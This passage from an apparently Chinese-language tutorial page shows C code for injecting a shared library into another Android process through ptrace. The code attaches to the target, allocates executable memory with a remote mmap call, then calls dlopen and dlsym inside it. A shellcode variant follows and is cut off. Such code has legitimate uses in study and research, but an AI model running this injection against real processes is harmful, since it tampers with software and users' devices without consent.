(ptrace_continue(pid) == <span class="number">-1</span>) &#123;  </span><br><span class="line">            LOGD(<span class="string">"ptrace call error"</span>);  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取远程进程的寄存器值，方便获取返回值</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_getregs(pid, regs) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"After call getregs error"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    在指定进程中搜索对应模块的基址</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，若为-1表示自身进程，ModuleName表示要搜索的模块的名称</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示获取模块基址失败，返回非0为要搜索的模块基址</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">GetModuleBaseAddr</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* ModuleName)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;    </span><br><span class="line">    <span class="keyword">long</span> ModuleBaseAddr = <span class="number">0</span>; 	</span><br><span class="line">	<span class="keyword">char</span> *ModulePath, *MapFileLineItem;</span><br><span class="line">    <span class="keyword">char</span> szFileName[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;    </span><br><span class="line">    <span class="keyword">char</span> szMapFileLine[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szProcessInfo[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 读取"/proc/pid/maps"可以获得该进程加载的模块</span></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        <span class="comment">//  枚举自身进程模块 </span></span><br><span class="line">        <span class="built_in">snprintf</span>(szFileName, <span class="keyword">sizeof</span>(szFileName), <span class="string">"/proc/self/maps"</span>);    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">        <span class="built_in">snprintf</span>(szFileName, <span class="keyword">sizeof</span>(szFileName), <span class="string">"/proc/%d/maps"</span>, pid);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    fp = fopen(szFileName, <span class="string">"r"</span>);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) </span><br><span class="line">	&#123;    </span><br><span class="line">        <span class="keyword">while</span> (fgets(szMapFileLine, <span class="keyword">sizeof</span>(szMapFileLine), fp)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strstr</span>(szMapFileLine, ModuleName))</span><br><span class="line">			&#123;</span><br><span class="line">				MapFileLineItem = strtok(szMapFileLine, <span class="string">" \t"</span>); <span class="comment">// 基址信息</span></span><br><span class="line">                <span class="keyword">char</span> *Addr = strtok(szMapFileLine, <span class="string">"-"</span>);    </span><br><span class="line">                ModuleBaseAddr = strtoul(Addr, <span class="literal">NULL</span>, <span class="number">16</span> );    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (ModuleBaseAddr == <span class="number">0x8000</span>)    </span><br><span class="line">                    ModuleBaseAddr = <span class="number">0</span>;    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">break</span>;   				</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    </span><br><span class="line">        fclose(fp) ;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)ModuleBaseAddr;       </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    获取远程进程与本进程都加载的模块中函数的地址</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，ModuleName表示模块名称，LocalFuncAddr表示本地进程中该函数的地址</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回远程进程中对应函数的地址</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">GetRemoteFuncAddr</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span> *ModuleName, <span class="keyword">void</span> *LocalFuncAddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *LocalModuleAddr, *RemoteModuleAddr, *RemoteFuncAddr;</span><br><span class="line">	</span><br><span class="line">	LocalModuleAddr = GetModuleBaseAddr(<span class="number">-1</span>, ModuleName);</span><br><span class="line">	RemoteModuleAddr = GetModuleBaseAddr(pid, ModuleName);</span><br><span class="line">	</span><br><span class="line">	RemoteFuncAddr = (<span class="keyword">void</span> *)((<span class="keyword">long</span>)LocalFuncAddr - (<span class="keyword">long</span>)LocalModuleAddr + (<span class="keyword">long</span>)RemoteModuleAddr);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> RemoteFuncAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    通过远程直接调用dlopen\dlsym的方法ptrace注入so模块到远程进程中</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，LibPath为被远程注入的so模块路径，FunctionName为远程注入的模块后调用的函数</span></span><br><span class="line"><span class="comment">				  FuncParameter指向被远程调用函数的参数（若传递字符串，需要先将字符串写入到远程进程空间中），NumParameter为参数的个数</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示注入成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">char</span> *LibPath, <span class="keyword">char</span> *FunctionName, <span class="keyword">long</span> *FuncParameter, <span class="keyword">long</span> NumParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> iRet = <span class="number">-1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">CurrentRegs</span>, <span class="title">OriginalRegs</span>;</span>  <span class="comment">// CurrentRegs表示远程进程中当前的寄存器值，OriginalRegs存储注入前的寄存器值，方便恢复</span></span><br><span class="line">	<span class="keyword">void</span> *mmap_addr, *dlopen_addr, *dlsym_addr, *dlclose_addr, *dlerror_addr;   <span class="comment">// 远程进程中需要调用函数的地址</span></span><br><span class="line">	<span class="keyword">void</span> *RemoteMapMemoryAddr, *RemoteModuleAddr, *RemoteModuleFuncAddr; <span class="comment">// RemoteMapMemoryAddr为远程进程空间中映射的内存基址，RemoteModuleAddr为远程注入的so模块加载基址，RemoteModuleFuncAddr为注入模块中需要调用的函数地址</span></span><br><span class="line">	<span class="keyword">long</span> parameters[<span class="number">6</span>];  </span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Attach远程进程</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_attach(pid) == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 获取远程进程的寄存器值</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_getregs(pid, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LOGD(<span class="string">"ARM_r0:0x%lx, ARM_r1:0x%lx, ARM_r2:0x%lx, ARM_r3:0x%lx, ARM_r4:0x%lx, ARM_r5:0x%lx, ARM_r6:0x%lx, ARM_r7:0x%lx, ARM_r8:0x%lx, ARM_r9:0x%lx, ARM_r10:0x%lx, ARM_ip:0x%lx, ARM_sp:0x%lx, ARM_lr:0x%lx, ARM_pc:0x%lx"</span>, \</span><br><span class="line">		CurrentRegs.ARM_r0, CurrentRegs.ARM_r1, CurrentRegs.ARM_r2, CurrentRegs.ARM_r3, CurrentRegs.ARM_r4, CurrentRegs.ARM_r5, CurrentRegs.ARM_r6, CurrentRegs.ARM_r7, CurrentRegs.ARM_r8, CurrentRegs.ARM_r9, CurrentRegs.ARM_r10, CurrentRegs.ARM_ip, CurrentRegs.ARM_sp, CurrentRegs.ARM_lr, CurrentRegs.ARM_pc);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 保存远程进程空间中当前的上下文寄存器环境</span></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;OriginalRegs, &amp;CurrentRegs, <span class="keyword">sizeof</span>(CurrentRegs)); </span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 获取mmap函数在远程进程中的地址</span></span><br><span class="line">	mmap_addr = GetRemoteFuncAddr(pid, libc_path, (<span class="keyword">void</span> *)mmap);</span><br><span class="line">	LOGD(<span class="string">"mmap RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)mmap_addr);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置mmap的参数</span></span><br><span class="line">	<span class="comment">// void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize);</span></span><br><span class="line">    parameters[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// 设置为NULL表示让系统自动选择分配内存的地址    </span></span><br><span class="line">    parameters[<span class="number">1</span>] = <span class="number">0x1000</span>; <span class="comment">// 映射内存的大小    </span></span><br><span class="line">    parameters[<span class="number">2</span>] = PROT_READ | PROT_WRITE | PROT_EXEC;  <span class="comment">// 表示映射内存区域可读可写可执行   </span></span><br><span class="line">    parameters[<span class="number">3</span>] =  MAP_ANONYMOUS | MAP_PRIVATE; <span class="comment">// 建立匿名映射    </span></span><br><span class="line">    parameters[<span class="number">4</span>] = <span class="number">0</span>; <span class="comment">//  若需要映射文件到内存中，则为文件的fd  </span></span><br><span class="line">    parameters[<span class="number">5</span>] = <span class="number">0</span>; <span class="comment">//文件映射偏移量 	</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 调用远程进程的mmap函数，建立远程进程的内存映射</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)mmap_addr, parameters, <span class="number">6</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Call Remote mmap Func Failed"</span>);</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 获取mmap函数执行后的返回值，也就是内存映射的起始地址</span></span><br><span class="line">	RemoteMapMemoryAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line">	LOGD(<span class="string">"Remote Process Map Memory Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteMapMemoryAddr);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 分别获取dlopen、dlsym、dlclose等函数的地址</span></span><br><span class="line">	dlopen_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlopen);</span><br><span class="line">	dlsym_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlsym);</span><br><span class="line">	dlclose_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlclose);</span><br><span class="line">	dlerror_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlerror);</span><br><span class="line">	</span><br><span class="line">	LOGD(<span class="string">"dlopen RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlopen_addr);</span><br><span class="line">	LOGD(<span class="string">"dlsym RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlsym_addr);</span><br><span class="line">	LOGD(<span class="string">"dlclose RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlclose_addr);</span><br><span class="line">	LOGD(<span class="string">"dlerror RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlerror_addr);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 将要加载的so库路径写入到远程进程内存空间中</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_writedata(pid, RemoteMapMemoryAddr, LibPath, <span class="built_in">strlen</span>(LibPath) + <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Write LibPath:%s to RemoteProcess error"</span>, LibPath);</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置dlopen的参数,返回值为模块加载的地址</span></span><br><span class="line">	<span class="comment">// void *dlopen(const char *filename, int flag);</span></span><br><span class="line">	parameters[<span class="number">0</span>] = (<span class="keyword">long</span>)RemoteMapMemoryAddr;</span><br><span class="line">	parameters[<span class="number">1</span>] = RTLD_NOW| RTLD_GLOBAL;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)dlopen_addr, parameters, <span class="number">2</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Call Remote dlopen Func Failed"</span>);</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// RemoteModuleAddr为远程进程加载注入模块的地址</span></span><br><span class="line">	RemoteModuleAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line">	LOGD(<span class="string">"Remote Process load module Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteModuleAddr);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">long</span>)RemoteModuleAddr == <span class="number">0x0</span>)   <span class="comment">// dlopen 错误</span></span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"dlopen error"</span>);</span><br><span class="line">		<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)dlerror_addr, parameters, <span class="number">0</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			LOGD(<span class="string">"Call Remote dlerror Func Failed"</span>);</span><br><span class="line">			ptrace_detach(pid);</span><br><span class="line">			<span class="keyword">return</span> iRet;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">char</span> *Error = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line">		<span class="keyword">char</span> LocalErrorInfo[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		ptrace_readdata(pid, Error, LocalErrorInfo, <span class="number">1024</span>);</span><br><span class="line">		LOGD(<span class="string">"dlopen error:%s"</span>, LocalErrorInfo);</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 将so库中需要调用的函数名称写入到远程进程内存空间中</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_writedata(pid, RemoteMapMemoryAddr + <span class="built_in">strlen</span>(LibPath) + <span class="number">2</span>, FunctionName, <span class="built_in">strlen</span>(FunctionName) + <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Write FunctionName:%s to RemoteProcess error"</span>, FunctionName);</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置dlsym的参数，返回值为远程进程内函数的地址</span></span><br><span class="line">	<span class="comment">// void *dlsym(void *handle, const char *symbol);</span></span><br><span class="line">	parameters[<span class="number">0</span>] = (<span class="keyword">long</span>)RemoteModuleAddr;</span><br><span class="line">	parameters[<span class="number">1</span>] = (<span class="keyword">long</span>)(RemoteMapMemoryAddr + <span class="built_in">strlen</span>(LibPath) + <span class="number">2</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)dlsym_addr, parameters, <span class="number">2</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Call Remote dlsym Func Failed"</span>);</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// RemoteModuleFuncAddr为远程进程空间内获取的函数地址</span></span><br><span class="line">	RemoteModuleFuncAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line">	LOGD(<span class="string">"Remote Process ModuleFunc Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteModuleFuncAddr);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)RemoteModuleFuncAddr, FuncParameter, NumParameter, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Call Remote injected Func Failed"</span>);</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (ptrace_setregs(pid, &amp;OriginalRegs) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Recover reges failed"</span>);</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;		</span><br><span class="line">	&#125;</span><br><span class="line">	LOGD(<span class="string">"Recover Regs Success"</span>);</span><br><span class="line">	ptrace_getregs(pid, &amp;CurrentRegs);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">memcmp</span>(&amp;OriginalRegs, &amp;CurrentRegs, <span class="keyword">sizeof</span>(CurrentRegs)) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Set Regs Error"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//Detach</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_detach(pid) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"ptrace detach failed"</span>);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment">  Description:    通过shellcode方式ptrace注入so模块到远程进程中</span></span><br><span class="line"><span class="comment">  Input:          pid表示远程进程的ID，LibPath为被远程注入的so模块路径，FunctionName为远程注入的模块后调用的函数</span></span><br><span class="line"><span class="comment">				  FuncParameter指向被远程调用函数的参数（若传递字符串，需要先将字符串写入到远程进程空间中），NumParameter为参数的个数</span></span><br><span class="line"><span class="comment">  Output:         无</span></span><br><span class="line"><span class="comment">  Return:         返回0表示注入成功，返回-1表示失败</span></span><br><span class="line"><span class="comment">  Others:         无</span></span><br><span class="line"><span class="comment">*************************************************/</span> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inject_remote_process_shellcode</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">char</span> *LibPath, <span class="keyword">char</span> *FunctionName, <span class="keyword">long</span> *FuncParameter, <span class="keyword">long</span> NumParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> iRet = <span class="number">-1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">CurrentRegs</span>, <span class="title">OriginalRegs</span>;</span>  <span class="comment">// CurrentRegs表示远程进程中当前的寄存器值，OriginalRegs存储注入前的寄存器值，方便恢复</span></span><br><span class="line">	<span class="keyword">void</span> *mmap_addr, *dlopen_addr, *dlsym_addr, *dlclose_addr, *dlerror_addr;   <span class="comment">// 远程进程中需要调用函数的地址</span></span><br><span class="line">	<span class="keyword">void</span> *RemoteMapMemoryAddr, *RemoteModuleAddr, *RemoteModuleFuncAddr; <span class="comment">// RemoteMapMemoryAddr为远程进程空间中映射的内存基址，RemoteModuleAddr为远程注入的so模块加载基址，RemoteModuleFuncAddr为注入模块中需要调用的函数地址</span></span><br><span class="line">	<span class="keyword">long</span> parameters[<span class="number">10</span>];  </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">uint8_t</span> *dlopen_param1_ptr, *dlsym_param2_ptr, *saved_r0_pc_ptr, *inject_param_ptr, *remote_code_start_ptr, *local_code_start_ptr, *local_code_end_ptr;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">extern</span> <span class="keyword">uint32_t</span> _dlopen_addr_s, _dlopen_param1_s, _dlopen_param2_s, _dlsym_addr_s, \</span><br><span class="line">			_dlsym_param2_s, _dlclose_addr_s, _inject_start_s, _inject_end_s, _inject_function_param_s, \</span><br><span class="line">			_saved_cpsr_s, _saved_r0_pc_s;	</span><br><span class="line">			</span><br><span class="line">	<span class="keyword">uint32_t</span> code_length;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Attach远程进程</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_attach(pid) == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 获取远程进程的寄存器值</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_getregs(pid, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	LOGD(<span class="string">"ARM_r0:0x%lx, ARM_r1:0x%lx, ARM_r2:0x%lx, ARM_r3:0x%lx, ARM_r4:0x%lx, ARM_r5:0x%lx, ARM_r6:0x%lx, ARM_r7:0x%lx, ARM_r8:0x%lx, ARM_r9:0x%lx, ARM_r10:0x%lx, ARM_ip:0x%lx, ARM_sp:0x%lx, ARM_lr:0x%lx, ARM_pc:0x%lx"</span>, \</span><br><span class="line">		CurrentRegs.ARM_r0, CurrentRegs.ARM_r1, CurrentRegs.ARM_r2, CurrentRegs.ARM_r3, CurrentRegs.ARM_r4, CurrentRegs.ARM_r5, CurrentRegs.ARM_r6, CurrentRegs.ARM_r7, CurrentRegs.ARM_r8, CurrentRegs.ARM_r9, CurrentRegs.ARM_r10, CurrentRegs.ARM_ip, CurrentRegs.ARM_sp, CurrentRegs.ARM_lr, CurrentRegs.ARM_pc);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 保存远程进程空间中当前的上下文寄存器环境</span></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;OriginalRegs, &amp;CurrentRegs, <span class="keyword">sizeof</span>(CurrentRegs)); </span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 获取mmap函数在远程进程中的地址</span></span><br><span class="line">	mmap_addr = GetRemoteFuncAddr(pid, libc_path, (<span class="keyword">void</span> *)mmap);</span><br><span class="line">	LOGD(<span class="string">"mmap RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)mmap_addr);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置mmap的参数</span></span><br><span class="line">	<span class="comment">// void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize);</span></span><br><span class="line">    parameters[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// 设置为NULL表示让系统自动选择分配内存的地址    </span></span><br><span class="line">    parameters[<span class="number">1</span>] = <span class="number">0x4000</span>; <span class="comment">// 映射内存的大小    </span></span><br><span class="line">    parameters[<span class="number">2</span>] = PROT_READ | PROT_WRITE | PROT_EXEC;  <span class="comment">// 表示映射内存区域可读可写可执行   </span></span><br><span class="line">    parameters[<span class="number">3</span>] =  MAP_ANONYMOUS | MAP_PRIVATE; <span class="comment">// 建立匿名映射    </span></span><br><span class="line">    parameters[<span class="number">4</span>] = <span class="number">0</span>; <span class="comment">//  若需要映射文件到内存中，则为文件的fd  </span></span><br><span class="line">    parameters[<span class="number">5</span>] = <span class="number">0</span>; <span class="comment">//文件映射偏移量 	</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 调用远程进程的mmap函数，建立远程进程的内存映射</span></span><br><span class="line">	<span class="keyword">if</span> (ptrace_call(pid, (<span class="keyword">long</span>)mmap_addr, parameters, <span class="number">6</span>, &amp;CurrentRegs) == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		LOGD(<span class="string">"Call Remote mmap Func Failed"</span>);</span><br><span class="line">		ptrace_detach(pid);</span><br><span class="line">		<span class="keyword">return</span> iRet;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 获取mmap函数执行后的返回值，也就是内存映射的起始地址</span></span><br><span class="line">	RemoteMapMemoryAddr = (<span class="keyword">void</span> *)ptrace_getret(&amp;CurrentRegs);</span><br><span class="line">	LOGD(<span class="string">"Remote Process Map Memory Addr:0x%lx"</span>, (<span class="keyword">long</span>)RemoteMapMemoryAddr);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 分别获取dlopen、dlsym、dlclose等函数的地址</span></span><br><span class="line">	dlopen_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlopen);</span><br><span class="line">	dlsym_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlsym);</span><br><span class="line">	dlclose_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlclose);</span><br><span class="line">	dlerror_addr = GetRemoteFuncAddr(pid, linker_path, (<span class="keyword">void</span> *)dlerror);</span><br><span class="line">	</span><br><span class="line">	LOGD(<span class="string">"dlopen RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlopen_addr);</span><br><span class="line">	LOGD(<span class="string">"dlsym RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlsym_addr);</span><br><span class="line">	LOGD(<span class="string">"dlclose RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlclose_addr);</span><br><span class="line">	LOGD(<span class="string">"dlerror RemoteFuncAddr:0x%lx"</span>, (<span class="keyword">long</span>)dlerror_addr);	</span><br><span class="line"></span><br><span class="line">	remote_code_start_ptr = RemoteMapMemoryAddr + <span class="number">0x3C00</span>;    <span class="comment">// 远程进程中存放shellcode代码的起始地址</span></span><br><span class="line">	local_code_start_ptr = (<span class="keyword">uint8_t</span> *)&amp;_inject_start_s;     <span class="comment">// 本地进程中shellcode的起始地址</span></span><br><span class="line">	local_code_end_ptr = (<span class="keyword">uint8_t</span> *)&amp;_inject_end_s;          <span class="comment">// 本地进程中shellcode的结束地址</span></span><br><span class="line"></span><br><span class="line">	_dlopen_addr_s = (<span class="keyword">uint32_t</span>)dlopen_addr;</span><br><span class="line">	_dlsym_addr_s = (<span class="keyword">uint32_t</span>)dlsym_addr;</span><br><span class="line">	_dlclose_addr_s = (<span class="keyword">uint32_t</span>)dlclose_addr;</span><br><span class="line"></span><br><span class="line">	LOGD(<span class="string">"Inject Code Start:0x%x, end:0x%x"</span>, (<span class="keyword">int</span>)local_code_start_ptr, (<span class="keyword">int</span>)local_code_end_ptr);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 计算shellcode中一些变量的存放起始地址</span></span><br><span class="line">	code_length = (<span class="keyword">uint32_t</span>)&amp;_inject_end_s - (<span class="keyword">uint32_t</span>)&amp;_inject_start_s;</span><br><span class="line">	dlopen_param1_ptr = local_code_start_ptr + code_length + <span class="number">0x20</span>;</span><br><span class="line">	dlsym_param2_ptr = dlopen_param1_ptr + MAX_PATH;</span><br><span class="line">	saved_r0_pc_ptr = dlsym_param2_ptr + MAX_PATH;</span><br><span class="line">	inject_param_ptr = saved_r0_pc_ptr + MAX_PATH;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 写入dlopen的参数LibPath</span></span><br><span class="line">	<span class="built_in">strcpy</span>( dlopen_param1_ptr, LibPath );</span><br><span class="line">	_dlopen_param1_s = REMOTE_ADDR( dlopen_param1_ptr, local_code_start_ptr, remote_code_start_ptr );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 写入dlsym的第二个参数，需要调用的函数名称</span></span><br><span class="line">	<span 